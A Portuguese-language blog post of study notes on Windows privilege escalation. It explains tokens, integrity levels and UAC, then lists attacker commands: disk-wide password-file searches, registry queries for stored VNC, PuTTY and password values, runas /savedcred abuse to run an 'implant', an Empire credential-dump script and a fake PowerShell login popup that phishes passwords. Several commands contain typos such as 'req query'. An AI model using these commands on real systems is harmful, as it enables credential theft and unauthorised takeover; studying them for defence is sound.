---
layout: post
title: Windows Priv-Esc pt1
date: 2024-05-10
description: Windows Priv-Esc Series
categories: windows bhatagem
---

# Windows LPE notes...

```
- Pri-esc base:
  1. Pegar SYSTEM perm
  2. Assumir outro usuário
  3. Mudar integrity levels
  4. Tirar proveito de tokens
  5. Ganhar mais privilégios  
```

- De um lado temos os resources do sistema como arquivos, diretórios ou registries. E ous outros são usuários/process que desejam utilizar esses recursos...

- Entre resouces e process temos a divisão do sistema em que os process podem acessar qual recurso ... 
Como o acesso aos recursos é concedido ou negado ??
Então quando um resource possui o ```SECURITY DESCRIPTOR``` que é composto por ```OWNER```, ```GROUP``` e ```ACLs``` que descrevem quem pode ou não acessar os resources.
Por outro lado, os process usam tokens de acesso que são objects dedicados que descrevem a identidade do usuário. E o ```SECURITY REFERENCE MONITOR``` no Kernel verifica até mesmo a call de um process específico para um acesso específico é permitida ou não.
Primeiro é verificado o ```INTEGRITY LEVEL``` depois é verificado o OWNER e a ACL do resource.


- O process e os threads herdam um token dos parent process. Os Tokens de Acesso são a base de todas as autorizações ou "decisões" no sistema, concedidas ao usuário autorizado pelo LASS. Cada token de acesso inclui o ```CID``` dos usuários.
 - ```Primary Tokens``` = default security information of process or thread.
 - ```Impersonation Tokens``` = permite realizar operações utilizando token de acesso de outro usuário.

- ```PRIVILEGIES``` e ```ACCESS RIGHTS``` tem duas diferenças principais: Privilegies controlam o acesso a tarefas relacionadas ao sistema e Access Rights controlam o acesso a objects.
A segunda diferença é que os Privilegies são atribuídos a contas de usuário/grupo e os Access Rights atribuídos a ACLs de objetos.

```
- Privilegies:
  - Atribuido a users e groups
  - operações no sistema:
    - instalar/carregar drives
    - shutdown
    - mudar timezone


- Access Rights:
  - Atrbuido a Objects ACL
  - Acessar Objects protegidos:
    - arquivos/pastas, registry keys, services, network shares, access tokens...
```

- O ```User Access control``` (UAC) é um componente fundamental da visão geral de segurança da MS. O UAC ajuda a mitigar o impacto de malwares.

Cada aplicativo que requer o administrator access token deve solicitar-lo. A única exceção é o relacionamento que existe entre ```parent processes```. Os ```Child Processes``` herdam o acess token do ```parent process```. Entretanto, os parents e child process devem ter o mesmo ```Integrity Level```. 
O Windows protege processes marcando seus integrity levels. Os Integrity Levels são medidas de confiança. Um programa integrity “alta” é aquele que executa tarefas que modificam dados do sistema, como um programa de particionamento de disco, enquanto um programa de integrity “baixa” é aquele que executa tarefas que podem comprometer o sistema operacional, como um navegador da Web. 
Programas com integrity level mais baixos não podem modificar dados em programas com integrity levels mais altos. 
Quando um usuário padrão tenta executar um programa que requer um access token de administrator, o UAC exige que o usuário forneça credenciais de administrador válidas.

fonte:
https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview


- Integrity Level
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels

- Filtered Admin Token or Restricted Access Token
  - https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens

- Permissões "perigosas"?
  - ```SeBackupPriv``` - read qualquer arquivo
  - ```SeRestorePriv``` - write em qualquer arquivo
  - ```SeTakeOwnershipPriv``` - se tornar owner
  - ```SeTcbPriv``` - se tornar parte do TCB
  - ```SeLoadDriverPriv``` - load/unload drivers
  - ```SeCreateTokenPriv``` - criar primary token
  - ```SeImpersonatePriv``` - se tornar outro user
  - ```SeDebugPriv``` - acessar a memória de qualquer process


#### READ/REFS

- https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/
- https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/


>___


# Gathering Creds

## Procurando senhas em plaintext

- lista todos os diretorios a partir do c:\
- ``` C:\> dir /b /a /s c:\ > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Filtra por arquivos com nome "passw"
- ``` C:\> type output.txt | findstr /i passw ```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples


## Nomes e Extenções de arquivos interessantes para verificar

- Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc,
ftp, ssh, vpn, git, .kdbx, .db

- Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db

- ``` C:\> type output.txt | findstr /i algumas extenção ```



## Arquivos nos Registries 

- ``` req query "HKCU\Software\ORL\WinVNC3\Passowrd" ```
 
- ``` req query "HKCU\Software\TightVNC\Server" ```

- ``` req query "HKCU\Software\SimonTatham\PuTTY\Sessions" ```

- ``` req query "HKCU\Software\SimonTatham\PuTTY\Sessions\local" ```


- ``` req query HKLM /f password /c REG_SZ /s ```

- ``` req query HKLM /f password /c REG_SZ /s ```



## Abusing Credential Manager

- Credential Manager
  - O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas...

- Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI... Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada "cmdkey".

  - O cmdkey também permite listar essas informações.
    - ``` C:\> cmdkey /list ```

- We can access actualy the Admin home directory and run processes as Admin:
  - ``` C:\> runas /user:admin cmd.exe``` <===== precisa de admin pass

  - ``` C:\> runas /savedcred /user:admin cmd.exe ```
    - windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)

- Podemos listar todos os diretórios aos quais não temos acesso.
  - ``` C:\> runas /savedcred /user:admin "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\admin > c:\output-admin.txt" ```
    - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Também podemos usar esse comando para rodar um implant:
  - ``` C:\> runas /savedcred /user:admin "c:\path\to\implant.exe" ```



## Extraindo creds do Credential Manager

- Script from Empire...

- C:\> powershell import-module c:\path\to\cms.ps1 ; Enum-Creds



## Popup local para pegar as creds de um user

- Cria um popup que pede a senha do usuário atual

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```


Links adicionais:
- https://fuzzysecurity.com/tutorials/16.html
- https://xz.aliyun.com/t/3618

>___
